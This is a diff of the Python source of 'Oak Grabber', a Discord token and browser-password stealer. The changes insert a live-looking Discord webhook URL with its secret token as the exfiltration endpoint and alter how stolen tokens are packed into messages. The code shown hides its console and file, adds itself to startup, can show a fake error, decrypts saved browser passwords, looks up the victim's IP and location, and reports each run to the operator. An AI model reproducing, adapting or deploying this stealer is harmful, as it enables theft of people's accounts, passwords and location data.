@@ -2,15 +2,13 @@ import ctypes, time
 starttime = time.time()
 
 #config
-webhook = "webhook_here"#change webhook_here to ur webhook
+webhook = "https://discord.com/api/webhooks/1004450286322077696/JFrL9ap73jlinNSZRJ8QBmRQSFLzKycFzL9Y8no_UGhtifsY8yq8SGzHm4CLi4mW9w6h"#change webhook_here to ur webhook
 ping_on_run = True #get pinged when someone runs ur file (True/False)
 add_to_startup = True #adds exe file to startup (True/False)
-HideConsole = True #runs in the background (True/False)
+HideConsole = False #runs in the background (True/False)
 Selfhide = True #hides the file (True/False)
 fake_error_message = False #displays a fake error message when file ran. (True/False)
 error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.' #custom message here
-
-
 
 
 if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
@@ -60,6 +58,7 @@ def decrypt_password(buff, master_key):
             decrypted_pass = cipher.decrypt(payload)[:-16].decode()
             return decrypted_pass
         except Exception as f:
+        
             print(f)
             return "Chrome < 80"
 def find_tokens(path):
@@ -93,7 +92,6 @@ def main():
             ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
     os.chdir(roaming+ "/OakGrabber")
     if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
     ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
     gr = requests.get("https://ipinfo.io/json")
     if gr.status_code == 200:
@@ -147,21 +145,18 @@ def main():
      message = '@everyone **someone ran ur Oak Grabber**'
     else:
      message = '**someone ran ur Oak Grabber**'
-    embedMsg = "**someone ran ur Oak Grabber**\n\n**Tokens:** "
     for platforrm, path in default_paths.items():
         if not os.path.exists(path):
             continue
         tokens = find_tokens(path)
-        embedMsg = f"**someone ran ur Oak Grabber**\n\n"
         if len(tokens) > 0:
             for token in tokens:
                 if token in checked:
                     continue
                 checked.append(token)
-                embedMsg += f"**Token:** ```{token}```"
+                embedMsg = f"""**someone ran ur Oak Grabber**\n\n**Tokens:** ```{token}```"""
         else:
-            embedMsg = '```No tokens found.```'
-
+            embedMsg = '''**someone ran ur Oak Grabber**\n\n```No tokens found.```'''
 
     headers = {
         'Content-Type': 'application/json',
